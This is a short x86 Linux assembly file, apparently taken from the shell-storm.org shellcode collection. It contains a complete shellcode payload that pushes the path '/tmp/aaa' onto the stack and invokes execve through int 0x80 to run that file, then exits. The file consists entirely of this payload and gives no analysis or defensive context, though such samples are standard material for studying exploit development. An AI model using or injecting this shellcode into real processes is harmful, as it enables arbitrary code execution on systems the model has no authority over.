;http://www.shell-storm.org/shellcode/files/shellcode-606.php
global _start
section .text

_start:
    push   0xb
    pop    eax              ;eax=0xb
    cdq                     ;edx=0
    push   edx              ;push 0
    push   dword 0x6161612f ;/aaa
    push   dword 0x706d742f ;/tmp
    mov    ebx,esp          ;ebx = "/tmp/aaa"
    push   edx              ;push 0
    push   ebx              ;push "/tmp/aaa"
    mov    ecx,esp          ;ecx = ["/tmp/aaa", 0]
    int    0x80             ;execve(ebx, ecx, edx)

    push   0x1
    pop    eax
    int    0x80             ;exit
